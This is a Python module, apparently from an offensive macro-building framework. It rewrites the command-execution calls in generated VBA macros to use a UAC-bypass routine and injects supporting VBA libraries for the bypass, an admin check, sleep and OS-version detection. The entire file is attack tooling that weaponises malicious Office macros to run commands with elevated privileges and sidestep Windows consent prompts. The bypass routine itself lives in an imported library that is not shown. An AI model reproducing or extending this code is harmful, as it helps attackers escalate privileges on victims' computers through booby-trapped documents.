#!/usr/bin/env python
# encoding: utf-8

from modules.mp_module import MpModule
import vbLib.UACBypassExecuteCMDAsync
import vbLib.IsAdmin
import vbLib.Sleep
import vbLib.GetOSVersion
import logging



class UACBypass(MpModule):        


    
    def run(self):
        logging.info(" [+] Insert UAC Bypass routine ...")
        # Browse all vba modules and replace ExecuteCmdAsync by ExecUAC
        for vbaFile in self.getVBAFiles():
            f = open(vbaFile)
            content = f.readlines()
            f.close()
            
            for n,line in enumerate(content):
                if "ExecuteCmdAsync" in line and not "Sub ExecuteCmdAsync" in line:
                    content[n] = line.replace("ExecuteCmdAsync","BypassUACExec")
            
            # Write in new file 
            f = open(vbaFile, 'w')
            f.writelines(content)
            f.close()
         
        self.addVBALib(vbLib.UACBypassExecuteCMDAsync)
        self.addVBALib(vbLib.IsAdmin)
        self.addVBALib(vbLib.Sleep)
        self.addVBALib(vbLib.GetOSVersion)
            
        logging.info("   [-] OK!") 
        